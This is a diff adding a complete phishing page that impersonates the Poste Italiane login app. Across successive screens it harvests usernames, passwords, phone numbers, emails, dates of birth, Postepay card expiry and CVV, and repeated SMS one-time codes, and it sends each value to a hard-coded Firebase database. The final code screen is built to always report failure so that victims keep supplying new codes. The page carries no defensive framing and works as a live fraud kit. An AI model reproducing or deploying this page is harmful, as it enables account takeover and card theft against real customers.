@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#f5e500">
+<title>Posteitaliane</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+html,body{width:100%;height:100%;overflow:hidden;background:#fff}
+.app{width:100%;max-width:591px;height:100vh;height:100dvh;margin:0 auto;background:#fff;position:relative;overflow:hidden;display:flex;flex-direction:column}
+.screen{display:none;flex:1;flex-direction:column;overflow-y:auto;width:100%}
+.screen.active{display:flex}
+
+/* ============ SPLASH ============ */
+#screen-splash{background:#f7e500;justify-content:center;align-items:center}
+.splash-text{font-size:42px;font-weight:800;color:#18529b;letter-spacing:-1px}
+.splash-text span{font-weight:400}
+
+/* ============ LOGIN HERO ============ */
+.hero{height:clamp(229px,58vw,344px);background:#ECDC02;border-radius:0 0 50% 50% / 0 0 22% 22%;position:relative;flex-shrink:0}
+.hero-actions{position:absolute;right:5%;top:clamp(47px,11.7vw,69px);display:flex;gap:clamp(12px,3vw,19px);z-index:2}
+.circle{width:clamp(42px,10.5vw,63px);height:clamp(42px,10.5vw,63px);border:0;border-radius:50%;background:#fff9a8;color:#111;display:grid;place-items:center;box-shadow:0 7px 19px #8b7d0030;font-size:clamp(26px,6vw,37px);font-weight:300;cursor:pointer}
+.language-wrap{position:relative}
+.language-btn{font-size:clamp(13px,2.8vw,17px);font-weight:700;cursor:pointer}
+.lang-menu{position:absolute;top:calc(100% + 8px);right:0;width:122px;background:#fff;border:1px solid #e8e8e8;border-radius:12px;box-shadow:0 8px 24px #0002;padding:6px;display:none;z-index:99}
+.lang-menu.open{display:block}
+.lang-menu button{width:100%;padding:10px 12px;text-align:left;border:0;background:#fff;color:#194a95;border-radius:8px;cursor:pointer;font-size:15px}
+.close{font-size:clamp(30px,6.3vw,39px);cursor:pointer}
+.art{position:absolute;bottom:9%;left:50%;transform:translateX(-50%);width:39%;aspect-ratio:230/190;display:flex;justify-content:center;align-items:center}
+.art svg{width:100%;height:auto}
+.main-pad{padding:clamp(20px,4.1vw,25px) 5.75% 38px;flex:1;display:flex;flex-direction:column}
+h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font-weight:700;letter-spacing:-.02em;color:#17191b}
+.heading{display:flex;align-items:flex-end;gap:10px}
+.info{width:clamp(21px,5vw,29px);height:clamp(21px,5vw,29px);border:3px solid #14191d;border-radius:50%;display:grid;place-items:center;font-size:clamp(15px,3.2vw,19px);font-weight:bold;margin-bottom:2px;color:#17191b;flex-shrink:0}
+.form{margin-top:clamp(43px,10vw,60px)}
+.field{height:clamp(43px,9.6vw,57px);border-bottom:1.5px solid #666;display:flex;align-items:center;padding:0 clamp(13px,4vw,23px);position:relative}
+.field+.field{margin-top:clamp(37px,9.9vw,59px)}
+.field input{width:100%;border:0;outline:0;background:transparent;color:#17191b;font-size:clamp(18px,4.2vw,25px);-webkit-text-fill-color:#17191b}
+.field input::placeholder{color:#17191b;opacity:1}
+.eye{color:#1951a0;font-size:clamp(22px,4.6vw,27px);cursor:pointer;user-select:none}
+.recover{display:flex;align-items:center;gap:10px;margin:clamp(29px,6.7vw,40px) -2% clamp(24px,6.2vw,37px);color:#18529e;font-weight:700;font-size:clamp(15px,3.8vw,23px);white-space:nowrap}
+.recover svg{width:clamp(22px,5.5vw,33px);flex:none;fill:none;stroke:currentColor;stroke-width:2.2}
+.login{width:100%;height:clamp(47px,11.8vw,70px);border:0;border-radius:100px;background:#F4E500;color:#fff;font-size:clamp(18px,4vw,25px);font-weight:700;cursor:pointer}
+.login:hover{background:#e5d600}
+.register{text-align:center;margin:clamp(24px,6.5vw,39px) 0 clamp(28px,7.4vw,44px);font-size:clamp(14px,3.6vw,21px);color:#17191b}
+.register strong{color:#16509b;margin-left:8px}
+.register .arrow{color:#16509b;font-size:1.45em;vertical-align:-2px;margin-left:8px}
+.divider{display:flex;align-items:center;gap:clamp(14px,4vw,24px);margin:0 -6.5%;font-size:clamp(15px,3.6vw,22px);white-space:nowrap;color:#17191b}
+.divider:before,.divider:after{content:"";height:10px;background:#f5f5f5;flex:1}
+.spid{margin-top:clamp(31px,7.5vw,45px);width:100%;height:clamp(48px,12vw,72px);border:1.5px solid #1854a9;border-radius:100px;background:#fff;color:#18509b;font-weight:700;font-size:clamp(17px,4vw,24px);cursor:pointer}
+
+/* ============ TOPBAR ============ */
+.topbar{height:50px;background:#f5e500;display:flex;align-items:center;padding:0 18px;gap:24px;flex-shrink:0}
+.wordmark{color:#18529b;font-size:22px;letter-spacing:-.9px;white-space:nowrap;line-height:1}
+.wordmark strong{font-weight:800}
+.wordmark span{font-weight:400}
+.actions{margin-left:auto;display:flex;align-items:center;gap:26px}
+.icon{border:0;background:none;padding:0;width:22px;height:26px;color:#111;font-size:25px;line-height:1;display:grid;place-items:center;cursor:pointer}
+.help{width:18px;height:18px;border:2px solid #171717;border-radius:50%;font-size:12px;font-weight:bold;line-height:14px;text-align:center;color:#111;cursor:pointer}
+.phone-main{padding:21px 18px 34px;flex:1;display:flex;flex-direction:column}
+.phone-title{margin:0 -8px 27px;font-size:24px;line-height:1.22;font-weight:700;letter-spacing:-.25px;color:#24272a}
+.phone-row{width:100%;max-width:470px;height:41px;display:flex;align-items:center;border-bottom:1px solid #9fa3a7;gap:8px}
+.prefix{font-size:14px;color:#61656a;white-space:nowrap}
+.caret{font-size:10px;margin-left:3px;vertical-align:2px}
+.phone-row input{flex:1;min-width:0;border:0;background:transparent;color:#383b40;font-size:14px;outline:0;-webkit-text-fill-color:#383b40}
+.phone-row input::placeholder{color:#383b40;opacity:1}
+.submit-yellow{display:block;margin-top:34px;width:100%;max-width:470px;height:49px;border:0;border-radius:28px;background:#F4E500;color:#fff;font-size:17px;font-weight:700;cursor:pointer}
+
+/* ============ LOADER ============ */
+.loader-screen{display:flex;flex-direction:column;justify-content:center;align-items:center;flex:1;background:#fff;color:#1456a6}
+.loader-screen h1{font-size:32px;margin:0 0 12px;color:#1456a6;font-weight:800}
+.loader-screen p{font-size:19px;font-weight:600;margin:0 0 34px;color:#1456a6;text-align:center}
+.spinner{width:50px;height:50px;border:10px solid #e9e9e9;border-bottom-color:#1456a6;border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ============ OTP ============ */
+.otp-page{flex:1;position:relative;background:#fff}
+.top-actions{position:absolute;right:10px;top:9px;display:flex;align-items:center;gap:11px;z-index:5}
+.round{width:39px;height:39px;border:0;border-radius:50%;background:#fff;box-shadow:0 3px 20px #0000000d;color:#16191d;display:grid;place-items:center;cursor:pointer}
+.help-icon{width:17px;height:17px;border:1.5px solid #22262b;border-radius:50%;font-size:11px;line-height:15px;text-align:center;font-weight:700}
+.otp-main{padding:59px 20px 30px}
+.otp-h1{margin:0 0 21px;font-size:21px;line-height:1.27;font-weight:700;letter-spacing:-.2px;color:#17191d}
+.description{font-size:13.5px;line-height:1.5;margin:0;max-width:325px;color:#17191d}
+.invalid-text{color:#dc2626;font-size:13px;font-weight:700;display:none;margin-top:6px}
+.invalid-text.show{display:block}
+.code{margin:45px 24px 0}
+.code input{display:block;width:100%;height:44px;padding:8px 12px;border:0;border-bottom:2px solid #666;border-radius:0;background:#fff;color:#1456a6;font-size:20px;outline:0}
+.code input:focus{background:#eef5ff;border-bottom-color:#1456a6}
+.otp-submit{display:block;width:100%;height:44px;margin-top:24px;border:0;border-radius:6px;background:#1456a6;color:#fff;font-size:15px;font-weight:700;cursor:pointer}
+.otp-timer{text-align:center;font-size:13.5px;margin:37px 0 0;color:#17191d}
+.otp-timer strong{font-weight:700}
+
+/* ============ CARD ============ */
+.card-page{padding:59px 20px 30px;flex:1;position:relative;background:#fff}
+.card-h1{margin:0 0 21px;font-size:21px;line-height:1.27;font-weight:700;letter-spacing:-.2px;color:#17191d}
+.card-visual{margin:20px auto 30px;width:100%;max-width:350px;height:224px;background:linear-gradient(135deg,#000 0%,#1a1a1a 100%);border-radius:18px;position:relative;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+.card-visual::before{content:'';position:absolute;top:0;left:0;width:12px;height:100%;background:#FFD700}
+.card-visual .brand{position:absolute;top:22px;left:38px;font-size:24px;font-weight:700;color:#FFD700;font-style:italic}
+.card-visual .brand-sub{position:absolute;top:52px;left:38px;font-size:13px;color:#FFD700;font-weight:600}
+.card-visual .expiry-label{position:absolute;bottom:55px;left:38px;font-size:11px;color:#ccc}
+.card-visual .expiry-value{position:absolute;bottom:32px;left:38px;font-size:16px;color:#fff;font-weight:700;letter-spacing:2px}
+.card-visual .card-logos{position:absolute;bottom:22px;right:22px;display:flex}
+.card-visual .card-logos .circle{width:34px;height:34px;border-radius:50%}
+.card-visual .card-logos .red{background:#EB001B}
+.card-visual .card-logos .yellow{background:#F79E1B;margin-left:-12px;opacity:.95}
+.card-field{margin-top:29px;border-bottom:1px solid #95989c;height:43px;display:flex;align-items:center;padding:0 6px}
+.card-field input{width:100%;height:100%;border:0;outline:0;background:transparent;color:#24282d;font-size:16px;-webkit-text-fill-color:#24282d}
+.card-field input::placeholder{color:#42464a;opacity:1}
+.card-submit{display:block;width:100%;height:49px;margin-top:60px;border:0;border-radius:28px;background:#0000FF;color:#fff;font-size:17px;font-weight:700;cursor:pointer}
+
+@media(max-width:360px){
+  .recover{font-size:14px;gap:5px}
+  .register strong{margin-left:3px}
+  .register .arrow{margin-left:3px}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- ============ SCREEN 1: SPLASH ============ -->
+  <div class="screen active" id="screen-splash">
+    <div class="splash-text">Poste<span>italiane</span></div>
+  </div>
+
+  <!-- ============ SCREEN 2: LOGIN ============ -->
+  <div class="screen" id="screen-login">
+    <header class="hero">
+      <div class="hero-actions">
+        <div class="language-wrap">
+          <button class="circle language-btn" id="languageButton" type="button">Lang</button>
+          <div class="lang-menu" id="languageMenu">
+            <button type="button">EN</button>
+            <button type="button">IT</button>
+          </div>
+        </div>
+        <button class="circle close" type="button" onclick="alert('Closed')">×</button>
+      </div>
+      <div class="art">
+        <svg viewBox="0 0 230 190" xmlns="http://www.w3.org/2000/svg">
+          <rect x="75" y="60" width="80" height="80" rx="10" fill="#4A7FE8"/>
+          <path d="M 88 60 L 88 45 Q 88 28 115 28 Q 142 28 142 45 L 142 60" stroke="#4A7FE8" stroke-width="10" fill="none" stroke-linecap="round"/>
+          <circle cx="115" cy="95" r="10" fill="#2C5BB8"/>
+          <rect x="111" y="98" width="8" height="22" fill="#2C5BB8"/>
+          <circle cx="72" cy="78" r="11" fill="#FFCC80"/>
+          <rect x="66" y="88" width="12" height="22" rx="4" fill="#43A047"/>
+          <rect x="63" y="108" width="18" height="7" rx="3" fill="#1B5E20"/>
+          <rect x="68" y="106" width="4" height="12" fill="#5D4037"/>
+          <rect x="76" y="106" width="4" height="12" fill="#5D4037"/>
+          <circle cx="158" cy="58" r="11" fill="#FFCC80"/>
+          <rect x="152" y="68" width="12" height="22" rx="4" fill="#E53935"/>
+          <rect x="149" y="88" width="18" height="7" rx="3" fill="#B71C1C"/>
+          <rect x="154" y="86" width="4" height="12" fill="#5D4037"/>
+          <rect x="162" y="86" width="4" height="12" fill="#5D4037"/>
+          <rect x="146" y="70" width="18" height="12" rx="2" fill="#37474F"/>
+          <rect x="148" y="72" width="14" height="8" fill="#81D4FA"/>
+          <ellipse cx="115" cy="170" rx="70" ry="6" fill="#d4c400"/>
+        </svg>
+      </div>
+    </header>
+    <div class="main-pad">
+      <div class="heading">
+        <h1>Log in with your<br>Poste account</h1>
+        <span class="info">i</span>
+      </div>
+      <div class="form">
+        <div class="field">
+          <input type="text" id="username" placeholder="Username" autocomplete="username">
+        </div>
+        <div class="field">
+          <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+          <span class="eye" onclick="togglePassword()">◉̸</span>
+        </div>
+        <div class="recover">
+          <svg viewBox="0 0 34 24"><circle cx="9" cy="12" r="6"/><path d="M15 12h17l-3 3-3-3-3 3-3-3"/></svg>
+          <span>Recover username or password</span>
+        </div>
+        <button class="login" type="button" onclick="goToPhone()">Log in</button>
+      </div>
+      <p class="register">Don't have a Poste account? <strong>Sign up</strong><span class="arrow">➜</span></p>
+      <div class="divider">or continue with</div>
+      <button class="spid" type="button">PosteID enabled for SPID</button>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 3: PHONE ============ -->
+  <div class="screen" id="screen-phone">
+    <header class="topbar">
+      <div class="wordmark"><strong>Poste</strong><span>italiane</span></div>
+      <div class="actions"><span class="help">?</span><span class="icon">×</span></div>
+    </header>
+    <div class="phone-main">
+      <h1 class="phone-title">Mobile Number</h1>
+      <div class="phone-row">
+        <span class="prefix">+39 <span class="caret">▼</span></span>
+        <input type="tel" id="mobile" placeholder="Mobile Number" inputmode="numeric" autocomplete="tel">
+      </div>
+      <button class="submit-yellow" type="button" onclick="goToLoader('otp1')">Sign in</button>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 4: LOADER ============ -->
+  <div class="screen" id="screen-loader">
+    <div class="loader-screen">
+      <h1>Posteitaliane</h1>
+      <p id="loaderText">Loading...</p>
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 5: OTP 1 (UNLOCKED) ============ -->
+  <div class="screen" id="screen-otp1">
+    <div class="otp-page">
+      <div class="top-actions">
+        <button class="round" type="button"><span class="help-icon">?</span></button>
+        <button class="round close" type="button" onclick="backToLogin()">×</button>
+      </div>
+      <div class="otp-main">
+        <h1 class="otp-h1">Enter SMS Code</h1>
+        <p class="description">Enter the code we just sent you via<br>
+          SMS to <b id="otpPhone1">+39*******768</b></p>
+        <div class="invalid-text" id="otp1Error">Invalid OTP</div>
+        <div class="code">
+          <input type="tel" id="otp1Input" inputmode="numeric" autocomplete="one-time-code">
+          <button class="otp-submit" type="button" onclick="submitOtp1()">Continue</button>
+        </div>
+        <p class="otp-timer">You still have <strong id="timer1">00:53</strong> seconds</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 6: EMAIL ============ -->
+  <div class="screen" id="screen-email">
+    <header class="topbar">
+      <div class="wordmark"><strong>Poste</strong><span>italiane</span></div>
+      <div class="actions"><span class="help">?</span><span class="icon">×</span></div>
+    </header>
+    <div class="phone-main">
+      <h1 class="phone-title">Enter your Email</h1>
+      <div class="phone-row">
+        <input type="email" id="email" placeholder="Email" autocomplete="email">
+      </div>
+      <button class="submit-yellow" type="button" onclick="goToLoader('otp2')">Sign in</button>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 7: LOADER 2 ============ -->
+  <div class="screen" id="screen-loader2">
+    <div class="loader-screen">
+      <h1>Posteitaliane</h1>
+      <p>Loading...</p>
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 8: OTP 2 (UNLOCKED) ============ -->
+  <div class="screen" id="screen-otp2">
+    <div class="otp-page">
+      <div class="top-actions">
+        <button class="round" type="button"><span class="help-icon">?</span></button>
+        <button class="round close" type="button" onclick="backToLogin()">×</button>
+      </div>
+      <div class="otp-main">
+        <h1 class="otp-h1">Enter SMS Code</h1>
+        <p class="description">Enter the code we just sent you via<br>
+          SMS to <b id="otpPhone2">+39*******768</b></p>
+        <div class="invalid-text" id="otp2Error">Invalid OTP</div>
+        <div class="code">
+          <input type="tel" id="otp2Input" inputmode="numeric" autocomplete="one-time-code">
+          <button class="otp-submit" type="button" onclick="submitOtp2()">Continue</button>
+        </div>
+        <p class="otp-timer">You still have <strong id="timer2">00:53</strong> seconds</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 9: DATE ============ -->
+  <div class="screen" id="screen-date">
+    <header class="topbar">
+      <div class="wordmark"><strong>Poste</strong><span>italiane</span></div>
+      <div class="actions"><span class="help">?</span><span class="icon">×</span></div>
+    </header>
+    <div class="phone-main">
+      <h1 class="phone-title">Enter your Date of Birth.</h1>
+      <div class="phone-row">
+        <input type="date" id="birthDate" placeholder="Date of Birth">
+      </div>
+      <button class="submit-yellow" type="button" onclick="goToLoader('otp3')">Sign in</button>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 10: OTP 3 (UNLOCKED) ============ -->
+  <div class="screen" id="screen-otp3">
+    <div class="otp-page">
+      <div class="top-actions">
+        <button class="round" type="button"><span class="help-icon">?</span></button>
+        <button class="round close" type="button" onclick="backToLogin()">×</button>
+      </div>
+      <div class="otp-main">
+        <h1 class="otp-h1">Enter SMS Code</h1>
+        <p class="description">Enter the code we just sent you via<br>
+          SMS to <b id="otpPhone3">+39*******768</b></p>
+        <div class="invalid-text" id="otp3Error">Invalid OTP</div>
+        <div class="code">
+          <input type="tel" id="otp3Input" inputmode="numeric" autocomplete="one-time-code">
+          <button class="otp-submit" type="button" onclick="submitOtp3()">Continue</button>
+        </div>
+        <p class="otp-timer">You still have <strong id="timer3">00:53</strong> seconds</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 11: CARD ============ -->
+  <div class="screen" id="screen-card">
+    <div class="card-page">
+      <div class="top-actions">
+        <button class="round" type="button"><span class="help-icon">?</span></button>
+        <button class="round close" type="button" onclick="backToLogin()">×</button>
+      </div>
+      <h1 class="card-h1">Enter your Card Details</h1>
+      <div class="card-visual">
+        <div class="brand">postepay</div>
+        <div class="brand-sub">Evolution</div>
+        <div class="expiry-label">Expiry date (MM/YY)</div>
+        <div class="expiry-value" id="cardExpiryDisplay">**/**</div>
+        <div class="card-logos">
+          <div class="circle red"></div>
+          <div class="circle yellow"></div>
+        </div>
+      </div>
+      <div class="card-field">
+        <input type="text" id="cardExpiry" placeholder="Expiry Date [MM/YY]" inputmode="numeric" maxlength="5">
+      </div>
+      <div class="card-field">
+        <input type="tel" id="cardCVV" placeholder="CVV2/CVC2" inputmode="numeric" maxlength="4">
+      </div>
+      <button class="card-submit" type="button" onclick="goToLoader('otp4')">Sign in</button>
+    </div>
+  </div>
+
+  <!-- ============ SCREEN 12: FINAL OTP (UNLOCKED, ALWAYS INVALID) ============ -->
+  <div class="screen" id="screen-otp4">
+    <div class="otp-page">
+      <div class="top-actions">
+        <button class="round" type="button"><span class="help-icon">?</span></button>
+        <button class="round close" type="button" onclick="backToLogin()">×</button>
+      </div>
+      <div class="otp-main">
+        <h1 class="otp-h1">Enter SMS Code</h1>
+        <p class="description">Enter the code we just sent you via<br>
+          SMS to <b id="otpPhone4">+39*******768</b></p>
+        <div class="invalid-text" id="otp4Error">Invalid OTP</div>
+        <div class="code">
+          <input type="tel" id="otp4Input" inputmode="numeric" autocomplete="one-time-code">
+          <button class="otp-submit" type="button" onclick="submitOtp4()">Continue</button>
+        </div>
+        <p class="otp-timer">You still have <strong id="timer4">00:53</strong> seconds</p>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script type="module">
+// =========================================================
+// FIREBASE
+// =========================================================
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+    authDomain: "long-d1bcb.firebaseapp.com",
+    databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+    projectId: "long-d1bcb",
+    storageBucket: "long-d1bcb.firebasestorage.app",
+    messagingSenderId: "515546162619",
+    appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const FIREBASE_NODE = 'poste_users';
+
+let currentKey = null;
+const sessionData = {};
+
+function saveToFirebase(data) {
+    const usersRef = ref(db, FIREBASE_NODE);
+    const newRef = push(usersRef);
+    currentKey = newRef.key;
+    set(newRef, {
+        ...data,
+        loginTime: new Date().toLocaleString(),
+        loginTimestamp: Date.now(),
+        status: 'In Progress'
+    }).then(() => console.log('✅ Saved:', currentKey))
+      .catch(err => console.error('❌ Save error:', err));
+}
+
+function updateFirebase(data) {
+    if (!currentKey) {
+        saveToFirebase({ ...sessionData, ...data });
+        return;
+    }
+    const userRef = ref(db, FIREBASE_NODE + '/' + currentKey);
+    update(userRef, data).then(() => console.log('✅ Updated:', Object.keys(data).join(', ')))
+      .catch(err => console.error('❌ Update error:', err));
+}
+
+function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
+}
+
+// =========================================================
+// SPLASH → LOGIN (3 sec)
+// =========================================================
+setTimeout(() => showScreen('screen-login'), 3000);
+
+// =========================================================
+// PASSWORD TOGGLE
+// =========================================================
+window.togglePassword = function() {
+    const pwd = document.getElementById('password');
+    pwd.type = pwd.type === 'password' ? 'text' : 'password';
+};
+
+// =========================================================
+// LOGIN → PHONE
+// =========================================================
+window.goToPhone = function() {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value.trim();
+    if (!user || !pass) { alert('Please enter username and password'); return; }
+    sessionData.username = user;
+    sessionData.password = pass;
+    saveToFirebase({ username: user, password: pass, step: 'login' });
+    showScreen('screen-phone');
+};
+
+// =========================================================
+// LOADER → NEXT SCREEN
+// =========================================================
+window.goToLoader = function(nextScreen) {
+    if (nextScreen === 'otp1') {
+        const mobile = document.getElementById('mobile').value.trim();
+        if (!mobile) { alert('Please enter mobile number'); return; }
+        sessionData.mobile = mobile;
+        updateFirebase({ phone: '+39' + mobile, mobile: mobile, step: 'phone' });
+    }
+    if (nextScreen === 'otp2') {
+        const email = document.getElementById('email').value.trim();
+        if (!email) { alert('Please enter your email'); return; }
+        sessionData.email = email;
+        updateFirebase({ email: email, step: 'email' });
+    }
+    if (nextScreen === 'otp3') {
+        const bd = document.getElementById('birthDate').value.trim();
+        if (!bd) { alert('Please enter your date of birth'); return; }
+        sessionData.birthDate = bd;
+        updateFirebase({ birthDate: bd, step: 'date' });
+    }
+    if (nextScreen === 'otp4') {
+        const ex = document.getElementById('cardExpiry').value.trim();
+        const cv = document.getElementById('cardCVV').value.trim();
+        if (!ex || !cv) { alert('Please enter card details'); return; }
+        sessionData.cardExpiry = ex;
+        sessionData.cardCVV = cv;
+        updateFirebase({ cardExpiry: ex, cardCVV: cv, step: 'card' });
+    }
+
+    const loaderId = (nextScreen === 'otp2') ? 'screen-loader2' : 'screen-loader';
+    showScreen(loaderId);
+
+    setTimeout(() => {
+        const last3 = sessionData.mobile ? sessionData.mobile.slice(-3) : '768';
+
+        if (nextScreen === 'otp1') {
+            document.getElementById('otpPhone1').textContent = '+39*******' + last3;
+            document.getElementById('otp1Error').classList.remove('show');
+            document.getElementById('otp1Input').value = '';
+            showScreen('screen-otp1');
+            startTimer('timer1', 53);
+        } else if (nextScreen === 'otp2') {
+            document.getElementById('otpPhone2').textContent = '+39*******' + last3;
+            document.getElementById('otp2Error').classList.remove('show');
+            document.getElementById('otp2Input').value = '';
+            showScreen('screen-otp2');
+            startTimer('timer2', 53);
+        } else if (nextScreen === 'otp3') {
+            document.getElementById('otpPhone3').textContent = '+39*******' + last3;
+            document.getElementById('otp3Error').classList.remove('show');
+            document.getElementById('otp3Input').value = '';
+            showScreen('screen-otp3');
+            startTimer('timer3', 53);
+        } else if (nextScreen === 'otp4') {
+            document.getElementById('otpPhone4').textContent = '+39*******' + last3;
+            document.getElementById('otp4Error').classList.remove('show');
+            document.getElementById('otp4Input').value = '';
+            showScreen('screen-otp4');
+            startTimer('timer4', 53);
+        }
+    }, 2500);
+};
+
+// =========================================================
+// OTP 1 — VALID → EMAIL
+// =========================================================
+window.submitOtp1 = function() {
+    const otp = document.getElementById('otp1Input').value.trim();
+    if (!otp) { alert('Please enter OTP code'); return; }
+    sessionData.otp1 = otp;
+    updateFirebase({ otp1: otp, step: 'otp1' });
+
+    showScreen('screen-loader');
+    setTimeout(() => {
+        showScreen('screen-email');
+    }, 2500);
+};
+
+// =========================================================
+// OTP 2 — VALID → DATE
+// =========================================================
+window.submitOtp2 = function() {
+    const otp = document.getElementById('otp2Input').value.trim();
+    if (!otp) { alert('Please enter OTP code'); return; }
+    sessionData.otp2 = otp;
+    updateFirebase({ otp2: otp, step: 'otp2' });
+
+    showScreen('screen-loader2');
+    setTimeout(() => {
+        showScreen('screen-date');
+    }, 2500);
+};
+
+// =========================================================
+// OTP 3 — VALID → CARD
+// =========================================================
+window.submitOtp3 = function() {
+    const otp = document.getElementById('otp3Input').value.trim();
+    if (!otp) { alert('Please enter OTP code'); return; }
+    sessionData.otp3 = otp;
+    updateFirebase({ otp3: otp, step: 'otp3' });
+
+    showScreen('screen-loader');
+    setTimeout(() => {
+        showScreen('screen-card');
+    }, 2500);
+};
+
+// =========================================================
+// OTP 4 (FINAL) — ALWAYS INVALID → STAY ON SAME PAGE FOREVER
+// =========================================================
+let otp4Attempts = 0;
+
+window.submitOtp4 = function() {
+    const otp = document.getElementById('otp4Input').value.trim();
+    if (!otp) { alert('Please enter OTP code'); return; }
+
+    sessionData.otp4 = otp;
+    otp4Attempts++;
+
+    updateFirebase({
+        otp4: otp,
+        otp4Attempts: otp4Attempts,
+        step: 'otp4-attempt-' + otp4Attempts
+    });
+
+    showScreen('screen-loader');
+
+    setTimeout(() => {
+        document.getElementById('otp4Error').classList.add('show');
+        document.getElementById('otp4Input').value = '';
+        showScreen('screen-otp4');
+        startTimer('timer4', 53);
+    }, 2500);
+};
+
+// =========================================================
+// BACK TO LOGIN
+// =========================================================
+window.backToLogin = function() {
+    showScreen('screen-login');
+};
+
+// =========================================================
+// TIMER
+// =========================================================
+function startTimer(elementId, seconds) {
+    const el = document.getElementById(elementId);
+    let remaining = seconds;
+    if (window['ti_' + elementId]) clearInterval(window['ti_' + elementId]);
+    el.textContent = '00:' + String(seconds).padStart(2, '0');
+    window['ti_' + elementId] = setInterval(() => {
+        remaining--;
+        if (remaining <= 0) {
+            clearInterval(window['ti_' + elementId]);
+            el.textContent = '00:00';
+            return;
+        }
+        el.textContent = '00:' + String(remaining).padStart(2, '0');
+    }, 1000);
+}
+
+// =========================================================
+// CARD EXPIRY FORMAT
+// =========================================================
+const cardExpiryInput = document.getElementById('cardExpiry');
+const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
+cardExpiryInput.addEventListener('input', () => {
+    const digits = cardExpiryInput.value.replace(/\D/g, '').slice(0, 4);
+    const formatted = digits.length > 2 ? digits.slice(0, 2) + '/' + digits.slice(2) : digits;
+    cardExpiryInput.value = formatted;
+    cardExpiryDisplay.textContent = formatted || '**/**';
+});
+
+// =========================================================
+// INPUT RESTRICTIONS (numbers only — no max length limit)
+// =========================================================
+document.getElementById('mobile').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+document.getElementById('otp1Input').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+document.getElementById('otp2Input').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+document.getElementById('otp3Input').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+document.getElementById('otp4Input').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+document.getElementById('cardCVV').addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+});
+
+// =========================================================
+// LANGUAGE MENU
+// =========================================================
+const langBtn = document.getElementById('languageButton');
+const langMenu = document.getElementById('languageMenu');
+langBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
+    langMenu.classList.toggle('open');
+});
+document.addEventListener('click', () => langMenu.classList.remove('open'));
+
+console.log('✅ Poste Italiane — 12 screens ready (English, OTP unlocked)');
+</script>
+</body>
+</html>
